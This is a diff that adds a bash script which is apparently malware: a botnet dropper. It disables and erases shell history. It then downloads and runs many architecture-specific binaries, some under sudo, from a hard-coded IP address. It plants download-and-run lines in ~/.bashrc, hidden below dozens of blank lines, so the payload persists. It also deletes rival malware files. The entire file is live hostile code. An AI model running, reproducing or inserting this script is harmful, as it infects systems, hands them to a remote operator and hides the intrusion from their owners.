@@ -1,0 +1,146 @@
+#!/bin/bash
+rm -rf /tmp/mizakotropista*
+rm -rf /tmp/zekinha*
+rm -rf mizakotropista*
+rm -rf zekinha*
+rm -rf roubado.*
+rm -rf /tmp/roubado*
+unset HISTFILE; unset SAVEHIST
+echo "unset HISTFILE; unset SAVEHIST" >> ~/.bashrc
+cd /tmp; wget http://54.39.248.217/a6sda56s4das54d5456asd/mizakotropista86; curl -O http://54.39.248.217/a6sda56s4das54d5456asd/mizakotropista86;cat mizakotropista86 >zekinha;chmod +x *;./zekinha newmach
+cd /tmp; wget http://54.39.248.217/a6sda56s4das54d5456asd/mizakotropistaps; curl -O http://54.39.248.217/a6sda56s4das54d5456asd/mizakotropistaps;cat mizakotropistaps >zekinha;chmod +x *;./zekinha newmach
+cd /tmp; wget http://54.39.248.217/a6sda56s4das54d5456asd/mizakotropistasl; curl -O http://54.39.248.217/a6sda56s4das54d5456asd/mizakotropistasl;cat mizakotropistasl >zekinha;chmod +x *;./zekinha newmach
+cd /tmp; wget http://54.39.248.217/a6sda56s4das54d5456asd/mizakotropistam4; curl -O http://54.39.248.217/a6sda56s4das54d5456asd/mizakotropistam4;cat mizakotropistam4 >zekinha;chmod +x *;./zekinha newmach
+cd /tmp; wget http://54.39.248.217/a6sda56s4das54d5456asd/mizakotropistam5; curl -O http://54.39.248.217/a6sda56s4das54d5456asd/mizakotropistam5;cat mizakotropistam5 >zekinha;chmod +x *;./zekinha newmach
+cd /tmp; wget http://54.39.248.217/a6sda56s4das54d5456asd/mizakotropistam6; curl -O http://54.39.248.217/a6sda56s4das54d5456asd/mizakotropistam6;cat mizakotropistam6 >zekinha;chmod +x *;./zekinha newmach
+cd /tmp; wget http://54.39.248.217/a6sda56s4das54d5456asd/mizakotropistam7; curl -O http://54.39.248.217/a6sda56s4das54d5456asd/mizakotropistam7;cat mizakotropistam7 >zekinha;chmod +x *;./zekinha newmach
+cd /tmp; wget http://54.39.248.217/a6sda56s4das54d5456asd/mizakotropistapc; curl -O http://54.39.248.217/a6sda56s4das54d5456asd/mizakotropistapc;cat mizakotropistapc >zekinha;chmod +x *;./zekinha newmach
+cd /tmp; wget http://54.39.248.217/a6sda56s4das54d5456asd/mizakotropista8k; curl -O http://54.39.248.217/a6sda56s4das54d5456asd/mizakotropista8k;cat mizakotropista8k >zekinha;chmod +x *;./zekinha newmach
+cd /tmp; wget http://54.39.248.217/a6sda56s4das54d5456asd/mizakotropistah4; curl -O http://54.39.248.217/a6sda56s4das54d5456asd/mizakotropistah4;cat mizakotropistah4 >zekinha;chmod +x *;./zekinha newmach
+cd /tmp; wget http://54.39.248.217/a6sda56s4das54d5456asd/mizakotropistax64; curl -O http://54.39.248.217/a6sda56s4das54d5456asd/mizakotropistax64;cat mizakotropistax64 >zekinha;chmod +x *;./zekinha newmach
+cd /tmp; wget http://54.39.248.217/a6sda56s4das54d5456asd/roubado.86; curl -O http://54.39.248.217/a6sda56s4das54d5456asd/roubado.86; chmod +x roubado.86; ./roubado.86
+cd /tmp; wget http://54.39.248.217/a6sda56s4das54d5456asd/roubado.8k; curl -O http://54.39.248.217/a6sda56s4das54d5456asd/roubado.8k; chmod +x roubado.8k; ./roubado.8k
+cd /tmp; wget http://54.39.248.217/a6sda56s4das54d5456asd/roubado.h4; curl -O http://54.39.248.217/a6sda56s4das54d5456asd/roubado.h4; chmod +x roubado.h4; ./roubado.h4
+cd /tmp; wget http://54.39.248.217/a6sda56s4das54d5456asd/roubado.m4; curl -O http://54.39.248.217/a6sda56s4das54d5456asd/roubado.m4; chmod +x roubado.m4; ./roubado.m4
+cd /tmp; wget http://54.39.248.217/a6sda56s4das54d5456asd/roubado.m5; curl -O http://54.39.248.217/a6sda56s4das54d5456asd/roubado.m5; chmod +x roubado.m5; ./roubado.m5
+cd /tmp; wget http://54.39.248.217/a6sda56s4das54d5456asd/roubado.m6; curl -O http://54.39.248.217/a6sda56s4das54d5456asd/roubado.m6; chmod +x roubado.m6; ./roubado.m6
+cd /tmp; wget http://54.39.248.217/a6sda56s4das54d5456asd/roubado.m7; curl -O http://54.39.248.217/a6sda56s4das54d5456asd/roubado.m7; chmod +x roubado.m7; ./roubado.m7
+cd /tmp; wget http://54.39.248.217/a6sda56s4das54d5456asd/roubado.pc; curl -O http://54.39.248.217/a6sda56s4das54d5456asd/roubado.pc; chmod +x roubado.pc; ./roubado.pc
+cd /tmp; wget http://54.39.248.217/a6sda56s4das54d5456asd/roubado.ps; curl -O http://54.39.248.217/a6sda56s4das54d5456asd/roubado.ps; chmod +x roubado.ps; ./roubado.ps
+cd /tmp; wget http://54.39.248.217/a6sda56s4das54d5456asd/roubado.sl; curl -O http://54.39.248.217/a6sda56s4das54d5456asd/roubado.sl; chmod +x roubado.sl; ./roubado.sl
+cd /tmp; wget http://54.39.248.217/a6sda56s4das54d5456asd/roubado.spc; curl -O http://54.39.248.217/a6sda56s4das54d5456asd/roubado.spc; chmod +x roubado.spc; ./roubado.spc
+cd /tmp; wget http://54.39.248.217/a6sda56s4das54d5456asd/roubado.x64; curl -O http://54.39.248.217/a6sda56s4das54d5456asd/roubado.x64; chmod +x roubado.x64; ./roubado.x64
+cd /tmp; wget http://54.39.248.217/a6sda56s4das54d5456asd/bash; curl -O http://54.39.248.217/a6sda56s4das54d5456asd/bash; sudo chmod +x bash; sudo ./bash; sudo rm -rf bash
+cd /tmp; wget http://54.39.248.217/a6sda56s4das54d5456asd/bash; curl -O http://54.39.248.217/a6sda56s4das54d5456asd/bash; chmod +x bash; ./bash; rm -rf bash
+wget 54.39.248.217/x86 -O /tmp/x86; curl 54.39.248.217/x86 -o /tmp/x86; chmod +x /tmp/x86; rm -rf /tmp/x86.*
+wget 54.39.248.217/ulimit.sh -O /tmp/ulimit.sh; curl 54.39.248.217/ulimit.sh -o /tmp/ulimit.sh; chmod 777 /tmp/ulimit.sh; sh /tmp/ulimit.sh; rm -rf /tmp/ulimit.sh*
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+echo " " >> ~/.bashrc
+cat ~/.bashrc | grep -v "curl" >> /tmp/.bashrcbak
+rm -rf ~/.bashrc
+mv /tmp/.bashrcbak ~/.bashrc
+rm -rf /tmp/.bashrcbak
+echo "cd /tmp; wget http://54.39.248.217/a6sda56s4das54d5456asd/bash --quiet; curl -O http://54.39.248.217/a6sda56s4das54d5456asd/bash -s; sudo chmod +x bash; sudo ./bash; sudo rm -rf bash" >> ~/.bashrc
+echo "cd /tmp; wget http://54.39.248.217/a6sda56s4das54d5456asd/bash --quiet; curl -O http://54.39.248.217/a6sda56s4das54d5456asd/bash -s; chmod +x bash; ./bash; rm -rf bash" >> ~/.bashrc
+rm -rf /var/tmp/meca.pl
+rm -rf /var/tmp/meca2.pl
+rm -rf /tmp/meca2.pl
+rm -rf /tmp/meca.pl
+rm -rf /tmp/mizakotropista*
+rm -rf /tmp/zekinha*
+rm -rf /tmp/roubado*
+rm -rf roubado*
+rm -rf /tmp/*.sh
+rm -rf /tmp/*.pl.*
+rm -rf /tmp/*.pl
+rm -rf /tmp/*.sh
+rm -rf /tmp/*.arm
+rm -rf /tmp/*.arm5n
+rm -rf /tmp/*.arm7
+rm -rf /tmp/*.m68k
+rm -rf /tmp/*.mips
+rm -rf /tmp/*.mpsl
+rm -rf /tmp/*.ppc
+rm -rf /tmp/*.sh4
+rm -rf /tmp/*.spc
+rm -rf /tmp/*.x86
+rm -rf /var/tmp/*.arm
+rm -rf /var/tmp/*.arm5n
+rm -rf /var/tmp/*.arm7
+rm -rf /var/tmp/*.m68k
+rm -rf /var/tmp/*.mips
+rm -rf /var/tmp/*.mpsl
+rm -rf /var/tmp/*.ppc
+rm -rf /var/tmp/*.sh4
+rm -rf /var/tmp/*.spc
+rm -rf /var/tmp/*.x86
+echo "rm -rf ~/.bash_history" >> ~/.bashrc
+rm -rf ~/.bash_history
+history -c
+rm -rf /tmp/sshd*
+rm -rf /var/tmp/sshd*
+rm -rf /tmp/sshd.*
+rm -rf /var/tmp/sshd.*
+rm -rf /tmp/sshd*
+rm -rf /var/tmp/sshd*
+rm -rf /tmp/sshd
+rm -rf /var/tmp/sshd
